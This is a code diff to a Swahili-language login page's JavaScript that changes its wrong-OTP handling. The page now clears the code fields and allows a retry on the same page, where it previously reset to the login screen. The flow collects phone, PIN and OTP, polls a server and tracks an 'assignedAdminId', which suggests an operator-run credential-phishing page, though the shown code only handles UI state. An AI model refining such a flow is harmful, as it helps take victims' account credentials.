@@ -1061,29 +1061,15 @@
 
         } else if (data.status === 'wrongcode') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Unaelekezwa kwenye kuingia…');
-          setTimeout(() => {
-            // Reset OTP page state
-            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
-            document.getElementById('bOtp').className = 'btn-otp';
-            document.getElementById('bOtp').disabled = false;
-            document.getElementById('pinWait').classList.remove('show');
-            document.getElementById('otpInputSection').style.display = 'block';
-            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
-            document.getElementById('otpRs').innerHTML = 'Tuma tena msimbo ndani ya <span id="rsS">60</span> sekunde';
-            hideOtpMsgs();
-            // Reset login page state — clear PIN boxes but preserve phone number
-            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
-            // Re-enable login button (phone is still filled so it should become ready)
-            document.getElementById('bLogin').disabled = false;
-            const phoneVal = document.getElementById('lgPh').value.trim();
-            document.getElementById('bLogin').className = phoneVal ? 'btn-login rdy' : 'btn-login';
-            hideLoginMsg();
-            _loginInFlight = false;
-            S.applicationId = null;
-            S.assignedAdminId = null;
-            goTo('page-login');
-          }, 2500);
+          showOtpMsg('error', 'Msimbo wa OTP usio sahihi. Tafadhali angalia na uweke tena.');
+          // Clear OTP fields and allow retry on same page
+          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+          document.getElementById('bOtp').className = 'btn-otp';
+          document.getElementById('bOtp').disabled = false;
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = 'block';
+          // Focus on first OTP field for immediate retry
+          document.getElementById('o0').focus();
         }
 
       } catch (e) {
